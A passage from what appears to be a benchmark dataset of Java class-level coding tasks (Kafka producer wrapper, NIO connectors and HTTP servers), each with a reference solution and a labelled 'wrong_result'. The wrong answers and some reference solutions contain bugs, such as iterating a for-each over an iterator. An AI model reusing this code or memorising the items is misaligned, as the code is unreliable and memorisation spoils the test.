delete() {\n        release();\n        deleteIfExists(file);\n    }\n\n    public String prefix() {\n        return prefix;\n    }\n\n    public void release() {\n        synchronized (this) {\n            if (lock != null) {\n                lock.release();\n                lock = null;\n            }\n            if (channel != null) {\n                channel.close();\n                channel = null;\n            }\n        }\n    }\n\n    @Override\n    public void close() {\n        release();\n    }\n\n    private static void deleteIfExists(Path file) {\n        try {\n            Files.deleteIfExists(file);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to delete file: \" + file, e);\n        }\n    }\n\n    public static void close(AutoCloseable closeable) {\n        if (closeable != null) {\n            try {\n                closeable.close();\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to close resource\", e);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 261,
    "Instruction": "Task Description: Create a wrapper class for Kafka Producer to simplify message sending operations and resource management.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for interacting with a Kafka Producer, handling message sending, flushing, and proper resource cleanup. It encapsulates a KafkaProducer instance and delegates operations to it.\n\nAttributes:\n- producer: Producer<K, V> - The underlying Kafka Producer instance that handles actual message production\n\nMethods:\n- Constructor: KafkaProducerWrapper(Map<String, Object> configs, Serializer<K> keySerializer, Serializer<V> valueSerializer) -> void - Initializes the wrapper with Kafka configuration, key serializer, and value serializer\n- send: send(ProducerRecord<K, V> record) -> Future<RecordMetadata> - Sends a message to Kafka without a callback\n- send: send(ProducerRecord<K, V> record, Callback callback) -> Future<RecordMetadata> - Sends a message to Kafka with a callback\n- flush: flush() -> void - Flushes any buffered messages\n- close: close() -> void - Closes the producer immediately\n- close: close(Duration timeout) -> void - Closes the producer with a specified timeout",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.serialization.Serializer;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.concurrent.Future;\n\npublic class KafkaProducerWrapper<K, V> {\n\n    private final Producer<K, V> producer;\n\n    public KafkaProducerWrapper(Map<String, Object> configs, \n                              Serializer<K> keySerializer, \n                              Serializer<V> valueSerializer) {\n        this.producer = new KafkaProducer<>(configs, keySerializer, valueSerializer);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record) {\n        return producer.send(record);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record, Callback callback) {\n        return producer.send(record, callback);\n    }\n\n    public void flush() {\n        producer.flush();\n    }\n\n    public void close() {\n        producer.close();\n    }\n\n    public void close(Duration timeout) {\n        producer.close(timeout);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaProducerWrapper<K, V> {\n    private final Producer<K, V> producer;\n\n    public KafkaProducerWrapper(Map<String, Object> configs, Serializer<K> keySerializer, Serializer<V> valueSerializer) {\n        this.producer = new KafkaProducer<>(configs, keySerializer, valueSerializer);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record) {\n        return producer.send(record);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record, Callback callback) {\n        return producer.send(record, callback);\n    }\n\n    public void flush() {\n        producer.flush();\n    }\n\n    public void close() throws IOException {\n        producer.close();\n    }\n\n    public void close(Duration timeout) throws IOException {\n        producer.close(timeout);\n    }\n}"
  },
  {
    "Task_id": 262,
    "Instruction": "Task Description: Implement a Java class that manages non-blocking HTTP connections using Java NIO (New I/O) capabilities. The class should handle connection establishment, connection queue management, and distribute connections across multiple processors for load balancing.\n\nClass Description: NIOConnector is a thread-based class that manages asynchronous HTTP connections using Java NIO. It maintains a queue of pending connections, establishes them asynchronously, and distributes successfully established connections to a pool of NIOProcessor instances for further processing.\n\nAttributes:\n- name: String - The name identifier for this connector thread\n- selector: Selector - The NIO selector used for monitoring connection events\n- connectQueue: BlockingQueue<BackendConnection> - Queue holding pending connection requests\n- processors: NIOProcessor[] - Array of processors for handling established connections\n- nextProcessor: int - Index for round-robin processor selection\n- connectCount: long - Counter for tracking connection attempts\n\nMethods:\n- NIOConnector(String name) -> void - Constructor that initializes the connector with a name and opens a new selector\n- setProcessors(NIOProcessor[] processors) -> void - Sets the array of processors for connection distribution\n- postConnect(BackendConnection c) -> void - Adds a new connection request to the queue and wakes up the selector\n- run() -> void - Main thread loop that handles connection establishment and event processing\n- connect(Selector selector) -> void - Processes pending connections from the queue\n- finishConnect(SelectionKey key, Object att) -> void - Completes the connection process for a channel\n- clearSelectionKey(SelectionKey key) -> void - Cleans up a selection key after processing\n- nextProcessor() -> NIOProcessor - Selects the next processor in round-robin fashion\n\nInner Class:\n- ConnectIdGenerator - Generates unique IDs for established connections with thread-safe incrementing",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOConnector extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOConnector.class);\n    private static final ConnectIdGenerator ID_GENERATOR = new ConnectIdGenerator();\n\n    private final String name;\n    private final Selector selector;\n    private final BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long connectCount;\n\n    public NIOConnector(String name) throws IOException {\n        super.setName(name);\n        this.name = name;\n        this.selector = Selector.open();\n        this.connectQueue = new LinkedBlockingQueue<BackendConnection>();\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        connectQueue.offer(c);\n        selector.wakeup();\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++connectCount;\n            try {\n                selector.select(1000L);\n                connect(selector);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        Object att = key.attachment();\n                        if (att != null && key.isValid() && key.isConnectable()) {\n                            finishConnect(key, att);\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                }\n            } catch (Throwable e) {\n                LOGGER.warn(name, e);\n            }\n        }\n    }\n\n    private void connect(Selector selector) {\n        BackendConnection c = null;\n        while ((c = connectQueue.poll()) != null) {\n            try {\n                c.connect(selector);\n            } catch (Throwable e) {\n                c.error(ErrorCode.ERR_CONNECT_SOCKET, e);\n            }\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        BackendConnection c = (BackendConnection) att;\n        try {\n            if (c.finishConnect()) {\n                clearSelectionKey(key);\n                c.setId(ID_GENERATOR.getId());\n                NIOProcessor processor = nextProcessor();\n                c.setProcessor(processor);\n                processor.postRegister(c);\n            }\n        } catch (Throwable e) {\n            clearSelectionKey(key);\n            c.error(ErrorCode.ERR_FINISH_CONNECT, e);\n        }\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        if (key.isValid()) {\n            key.attach(null);\n            key.cancel();\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static class ConnectIdGenerator {\n        private static final long MAX_VALUE = Long.MAX_VALUE;\n        private long connectId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (connectId >= MAX_VALUE) {\n                    connectId = 0L;\n                }\n                return ++connectId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 20,
    "wrong_result": "public class NIOConnector implements Runnable {\n    private String name;\n    private Selector selector;\n    private BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long connectCount;\n    private final ConnectIdGenerator idGenerator = new ConnectIdGenerator();\n\n    public NIOConnector(String name) {\n        this.name = name;\n        try {\n            selector = Selector.open();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to open selector\", e);\n        }\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        connectQueue.offer(c);\n        selector.wakeup();\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                int events = selector.select();\n                if (events > 0) {\n                    for (SelectionKey key : selector.selectedKeys().iterator()) {\n                        if (key.isValid() && key.isConnectable()) {\n                            finishConnect(key, key.attachment());\n                        }\n                    }\n                }\n                connect();\n            } catch (IOException e) {\n                throw new RuntimeException(\"Selector error\", e);\n            }\n        }\n    }\n\n    private void connect() {\n        while (!connectQueue.isEmpty()) {\n            BackendConnection c = connectQueue.poll();\n            if (c == null) break;\n            try {\n                SocketChannel channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                channel.connect(c.getSocketAddress());\n                channel.register(selector, SelectionKey.OP_CONNECT, c);\n                connectCount++;\n            } catch (IOException e) {\n                throw new RuntimeException(\"Failed to connect\", e);\n            }\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        BackendConnection c = (BackendConnection) att;\n        SocketChannel channel = (SocketChannel) key.channel();\n        if (channel.finishConnect()) {\n            NIOProcessor processor = nextProcessor();\n            processor.handleConnection(c);\n            clearSelectionKey(key);\n        } else {\n            clearSelectionKey(key);\n        }\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        key.cancel();\n        try {\n            ((SocketChannel) key.channel()).close();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to close channel\", e);\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        return processors[nextProcessor++ % processors.length];\n    }\n\n    private class ConnectIdGenerator {\n        private AtomicInteger counter = new AtomicInteger(0);\n        public int generateId() {\n            return counter.incrementAndGet();\n        }\n    }\n}"
  },
  {
    "Task_id": 264,
    "Instruction": "Task Description: Implement a Java class that handles asynchronous socket connections using Java NIO (Non-blocking I/O) to manage incoming connections for a high-availability service. The class should be abstract, allowing subclasses to define specific connection handling logic.\n\nClass Description: AcceptSocketService is an abstract class that extends ServiceThread to provide a non-blocking socket server implementation. It manages incoming socket connections using ServerSocketChannel and Selector, delegating the creation of specific connection handlers to subclasses through an abstract method. The class handles the lifecycle of the server socket, including startup, connection acceptance, and shutdown.\n\nAttributes:\n- socketAddressListen: [SocketAddress] - The address and port to listen for incoming connections\n- serverSocketChannel: [ServerSocketChannel] - The server socket channel for accepting connections\n- selector: [Selector] - The selector for managing multiple non-blocking channels\n- messageStoreConfig: [MessageStoreConfig] - Configuration object containing server settings\n- log: [Logger] - Logger instance for recording events and errors\n\nMethods:\n- AcceptSocketService([MessageStoreConfig messageStoreConfig]) -> [void] - Constructor that initializes the service with configuration\n- beginAccept() -> [void] - Initializes and starts the server socket channel and selector\n- shutdown([boolean interrupt]) -> [void] - Shuts down the service and cleans up resources\n- run() -> [void] - Main service loop that handles incoming connections (inherited from ServiceThread)\n- createConnection([SocketChannel sc]) -> [HAConnection] - Abstract method to be implemented by subclasses for creating connection handlers",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Set;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.store.config.MessageStoreConfig;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\n\nprotected abstract class AcceptSocketService extends ServiceThread {\n    private final SocketAddress socketAddressListen;\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private final MessageStoreConfig messageStoreConfig;\n    private static final Logger log = LoggerFactory.getLogger(LoggerName.STORE_LOGGER_NAME);\n\n    public AcceptSocketService(final MessageStoreConfig messageStoreConfig) {\n        this.messageStoreConfig = messageStoreConfig;\n        this.socketAddressListen = new InetSocketAddress(messageStoreConfig.getHaListenPort());\n    }\n\n    public void beginAccept() throws Exception {\n        this.serverSocketChannel = ServerSocketChannel.open();\n        this.selector = NetworkUtil.openSelector();\n        this.serverSocketChannel.socket().setReuseAddress(true);\n        this.serverSocketChannel.socket().bind(this.socketAddressListen);\n        if (0 == messageStoreConfig.getHaListenPort()) {\n            messageStoreConfig.setHaListenPort(this.serverSocketChannel.socket().getLocalPort());\n            log.info(\"OS picked up {} to listen for HA\", messageStoreConfig.getHaListenPort());\n        }\n        this.serverSocketChannel.configureBlocking(false);\n        this.serverSocketChannel.register(this.selector, SelectionKey.OP_ACCEPT);\n    }\n\n    @Override\n    public void shutdown(final boolean interrupt) {\n        super.shutdown(interrupt);\n        try {\n            if (null != this.serverSocketChannel) {\n                this.serverSocketChannel.close();\n            }\n            if (null != this.selector) {\n                this.selector.close();\n            }\n        } catch (IOException e) {\n            log.error(\"AcceptSocketService shutdown exception\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(this.getServiceName() + \" service started\");\n        while (!this.isStopped()) {\n            try {\n                this.selector.select(1000);\n                Set<SelectionKey> selected = this.selector.selectedKeys();\n                if (selected != null) {\n                    for (SelectionKey k : selected) {\n                        if (k.isAcceptable()) {\n                            SocketChannel sc = ((ServerSocketChannel) k.channel()).accept();\n                            if (sc != null) {\n                                log.info(\"HAService receive new connection, \" + sc.socket().getRemoteSocketAddress());\n                                try {\n                                    HAConnection conn = createConnection(sc);\n                                    conn.start();\n                                } catch (Exception e) {\n                                    log.error(\"new HAConnection exception\", e);\n                                    sc.close();\n                                }\n                            }\n                        } else {\n                            log.warn(\"Unexpected ops in select \" + k.readyOps());\n                        }\n                    }\n                    selected.clear();\n                }\n            } catch (Exception e) {\n                log.error(this.getServiceName() + \" service has exception.\", e);\n            }\n        }\n        log.info(this.getServiceName() + \" service end\");\n    }\n\n    protected abstract HAConnection createConnection(final SocketChannel sc) throws IOException;\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "wrong_result": "public abstract class AcceptSocketService extends ServiceThread {\n    private final SocketAddress socketAddressListen;\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private final MessageStoreConfig messageStoreConfig;\n    private final Logger log;\n\n    public AcceptSocketService(MessageStoreConfig messageStoreConfig) {\n        this.messageStoreConfig = messageStoreConfig;\n        this.socketAddressListen = messageStoreConfig.getSocketAddress();\n        this.log = LoggerFactory.getLogger(AcceptSocketService.class);\n    }\n\n    public void beginAccept() throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.socket().bind(socketAddressListen);\n        selector = Selector.open();\n        serverSocketChannel.register(selector, OP_ACCEPT);\n    }\n\n    public void shutdown(boolean interrupt) {\n        if (serverSocketChannel != null) {\n            try {\n                serverSocketChannel.close();\n            } catch (IOException e) {\n                log.error(\"Error closing server socket\", e);\n            }\n        }\n        if (selector != null) {\n            try {\n                selector.close();\n            } catch (IOException e) {\n                log.error(\"Error closing selector\", e);\n            }\n        }\n        running = false;\n        if (interrupt) {\n            interrupt();\n        }\n    }\n\n    @Override\n    public void run() {\n        while (running) {\n            try {\n                int readyChannels = selector.select();\n                if (readyChannels == 0) continue;\n                for (SelectionKey key : selector.selectedKeys().iterator()) {\n                    if (key.isAcceptable()) {\n                        SocketChannel clientChannel = serverSocketChannel.accept();\n                        clientChannel.configureBlocking(false);\n                        HAConnection connection = createConnection(clientChannel);\n                        connection.init();\n                        clientChannel.register(selector, OP_READ);\n                    } else if (key.isReadable()) {\n                        // Handle readable events, perhaps through HAConnection\n                    }\n                }\n            } catch (IOException e) {\n                log.error(\"Error in selector\", e);\n            }\n        }\n    }\n\n    public abstract HAConnection createConnection(SocketChannel sc);\n}"
  },
  {
    "Task_id": 265,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles client connections asynchronously, processes incoming requests, and sends responses back to clients. The server should use non-blocking I/O operations managed by a Selector to efficiently handle multiple connections.\n\nClass Description: NioHttpServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) capabilities. It manages client connections, reads incoming requests, and writes responses asynchronously. The server can also make HTTP requests to external services (like Baidu in the example) to fetch response data.\n\nAttributes:\n- charset: [Charset] - The character set used for encoding/decoding text data (UTF-8 in this case)\n- client: [HttpClient] - Apache HttpClient instance used to make external HTTP requests\n\nMethods:\n- startServer: [startServer(int port)] -> [void] - Starts the HTTP server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop to handle client connections\n- handleAccept: [handleAccept(SelectionKey key, Selector selector)] -> [void] - Handles new client connections by accepting the SocketChannel and registering it with the selector for write operations\n- handleRead: [handleRead(SelectionKey key, Selector selector)] -> [void] - Handles incoming data from clients by reading from the SocketChannel and preparing for write operations\n- handleWrite: [handleWrite(SelectionKey key, Selector selector)] -> [void] - Handles writing data to clients by sending responses through the SocketChannel and preparing for read operations\n- executeResponse: [executeResponse()] -> [String] - Makes an HTTP GET request to an external service (Baidu in the example) and returns the response body as a string",
    "Canonical_solution": "import org.apache.commons.codec.Charsets;\nimport org.apache.http.HttpResponse;\nimport org.apache.http.HttpStatus;\nimport org.apache.http.client.HttpClient;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.HttpClientBuilder;\nimport org.apache.http.util.EntityUtils;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private static Charset charset = Charset.forName(\"UTF8\");\n    private HttpClient client = HttpClientBuilder.create().build();\n\n    public void startServer(int port) throws IOException {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        Selector selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            if (selector.select(1) > 0) {\n                Set<SelectionKey> set = selector.selectedKeys();\n                Iterator<SelectionKey> keyIterator = set.iterator();\n                while (keyIterator.hasNext()) {\n                    SelectionKey key = keyIterator.next();\n                    if (key.isAcceptable()) {\n                        handleAccept(key, selector);\n                    } else if (key.isReadable()) {\n                        handleRead(key, selector);\n                    } else if (key.isWritable()) {\n                        handleWrite(key, selector);\n                    }\n                    keyIterator.remove();\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n        selector.wakeup();\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String data = executeResponse().substring(0, 100);\n        byteBuffer.put(data.getBytes());\n        clientChannel.write(byteBuffer);\n        key.interestOps(SelectionKey.OP_READ);\n        selector.wakeup();\n    }\n\n    private String executeResponse() throws IOException {\n        String data = \"\";\n        HttpGet get = new HttpGet(\"http://www.baidu.com\");\n        HttpResponse response = client.execute(get);\n        if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {\n            data = EntityUtils.toString(response.getEntity(), Charsets.UTF_8);\n        }\n        return data;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "wrong_result": "public class NioHttpServer {\n    private final Charset charset = StandardCharsets.UTF_8;\n    private final HttpClient client = HttpClients.createDefault();\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private static final int BUFFER_SIZE = 1024;\n\n    public void startServer(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.bind(new InetSocketAddress(port));\n        selector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n        while (true) {\n            selector.select();\n            for (SelectionKey key : selector.selectedKeys().iterator()) {\n                if (key.isAcceptable()) {\n                    handleAccept(key, selector);\n                } else if (key.isReadable()) {\n                    handleRead(key, selector);\n                } else if (key.isWritable()) {\n                    handleWrite(key, selector);\n                }\n            }\n            selector.selectedKeys().clear();\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        ServerSocketChannel serverSocketChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverSocketChannel.accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(BUFFER_SIZE);\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead == -1) {\n            clientChannel.close();\n            key.cancel();\n            return;\n        }\n        buffer.flip();\n        StringBuilder requestLine = new StringBuilder();\n        for (int i = 0; i < buffer.limit(); i++) {\n            char c = (char) buffer.get(i);\n            if (c == '\\r' && i + 1 < buffer.limit() && buffer.get(i + 1) == '\\n') {\n                break;\n            }\n            requestLine.append(c);\n        }\n        String path = requestLine.toString().split(\" \")[1];\n        String responseBody = executeResponse();\n        ByteBuffer responseBuffer = ByteBuffer.allocate(1024);\n        responseBuffer.put(\"HTTP/1.1 200 OK\\r\\n\".getBytes(charset));\n        responseBuffer.put(\"Content-Type: text/html\\r\\n\".getBytes(charset));\n        responseBuffer.put(\"Content-Length: \" + responseBody.length() + \"\\r\\n\\r\\n\".getBytes(charset));\n        responseBuffer.flip();\n        clientChannel.write(responseBuffer);\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        clientChannel.finishWrite(key);\n        clientChannel.close();\n    }\n\n    private String executeResponse() throws IOException {\n        HttpGet request = new HttpGet(\"http://www.baidu.com\");\n        HttpResponse response = client.execute(request);\n        return EntityUtils.toString(response.getEntity(), charset);\n    }\n}"
  },
  {
    "Task_id": 266,
    "Instruction": "Task Description: Implement a non-blocking HTTP server using Java NIO (New I/O) that can handle multiple client connections concurrently. The server should be able to accept new connections, read incoming requests, and write responses asynchronously using separate threads for different operations.\n\nClass Description: NioHttpServer is a multi-threaded HTTP server implementation using Java NIO that handles client connections in a non-blocking manner. It uses three separate selectors for different operations: accepting connections, reading requests, and writing responses.\n\nAttributes:\n- serverSocketChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The selector for accepting new client connections\n- clientReadSelector: Selector - The selector for handling read operations from clients\n- clientWriteSelector: Selector - The selector for handling write operations to clients\n\nMethods:\n- NioHttpServer(int port) -> void - Constructor that initializes the server socket channel and selectors, binds to the specified port, and configures non-blocking mode\n- start() -> void - Starts three separate threads for handling server operations (accepting connections, reading requests, and writing responses)\n- ServerChannelThread(Selector serverSelector, Selector clientReadSelector) -> void - Nested class that handles accepting new client connections and registers them with the read selector\n- ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) -> void - Nested class that handles reading incoming requests from clients and registers them with the write selector when ready to respond\n- ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) -> void - Nested class that handles writing responses to clients and registers them back with the read selector when done",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private Selector clientReadSelector;\n    private Selector clientWriteSelector;\n\n    public NioHttpServer(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        selector = Selector.open();\n        clientReadSelector = Selector.open();\n        clientWriteSelector = Selector.open();\n        \n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void start() {\n        new Thread(new ServerChannelThread(selector, clientReadSelector)).start();\n        new Thread(new ClientReadChannelThread(clientReadSelector, clientWriteSelector)).start();\n        new Thread(new ClientWriteChannelThread(clientReadSelector, clientWriteSelector)).start();\n    }\n\n    private static class ServerChannelThread implements Runnable {\n        private Selector serverSelector;\n        private Selector clientReadSelector;\n\n        public ServerChannelThread(Selector serverSelector, Selector clientReadSelector) {\n            this.serverSelector = serverSelector;\n            this.clientReadSelector = clientReadSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (serverSelector.select(1) > 0) {\n                        Set<SelectionKey> set = serverSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n                            if (key.isAcceptable()) {\n                                SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n                                clientChannel.configureBlocking(false);\n                                clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                            }\n                            keyIterator.remove();\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientReadChannelThread implements Runnable {\n        private Selector clientReadSelector;\n        private Selector clientWriteSelector;\n\n        public ClientReadChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientReadSelector.select(1) > 0) {\n                        Set<SelectionKey> set = clientReadSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n\n                            if (key.isReadable()) {\n                                try {\n                                    SocketChannel clientChannel = (SocketChannel) key.channel();\n                                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                                    clientChannel.read(byteBuffer);\n                                    byteBuffer.flip();\n                                    System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n                                    clientChannel.register(clientWriteSelector, SelectionKey.OP_WRITE);\n                                } finally {\n                                    keyIterator.remove();\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ClientWriteChannelThread implements Runnable {\n        private Selector clientReadSelector;\n        private Selector clientWriteSelector;\n\n        public ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    if (clientWriteSelector.select(1) > 0) {\n                        Set<SelectionKey> set = clientWriteSelector.selectedKeys();\n                        Iterator<SelectionKey> keyIterator = set.iterator();\n\n                        while (keyIterator.hasNext()) {\n                            SelectionKey key = keyIterator.next();\n\n                            if (key.isWritable()) {\n                                try {\n                                    SocketChannel clientChannel = (SocketChannel) key.channel();\n                                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                                    String msg = \"server channel write: current time mill \" + System.currentTimeMillis();\n                                    byteBuffer.put(msg.getBytes());\n                                    byteBuffer.flip();\n                                    clientChannel.write(byteBuffer);\n                                    clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                                } finally {\n                                    keyIterator.remove();\n                                    key.interestOps(SelectionKey.OP_READ);\n                                }\n                            }\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "wrong_result": "public class NioHttpServer {\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private Selector clientReadSelector;\n    private Selector clientWriteSelector;\n\n    public NioHttpServer(int port) {\n        try {\n            serverSocketChannel = ServerSocketChannel.open();\n            serverSocketChannel.bind(new InetSocketAddress(port));\n            serverSocketChannel.configureBlocking(false);\n            selector = Selector.open();\n            clientReadSelector = Selector.open();\n            clientWriteSelector = Selector.open();\n            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        new Thread(new ServerChannelThread(selector, clientReadSelector)).start();\n        new Thread(new ClientReadChannelThread(clientReadSelector, clientWriteSelector)).start();\n        new Thread(new ClientWriteChannelThread(clientReadSelector, clientWriteSelector)).start();\n    }\n\n    private class ServerChannelThread implements Runnable {\n        private final Selector serverSelector;\n        private final Selector clientReadSelector;\n\n        public ServerChannelThread(Selector serverSelector, Selector clientReadSelector) {\n            this.serverSelector = serverSelector;\n            this.clientReadSelector = clientReadSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    int readyChannels = serverSelector.select();\n                    if (readyChannels == 0) continue;\n                    Iterator<SelectionKey> keys = serverSelector.selectedKeys().iterator();\n                    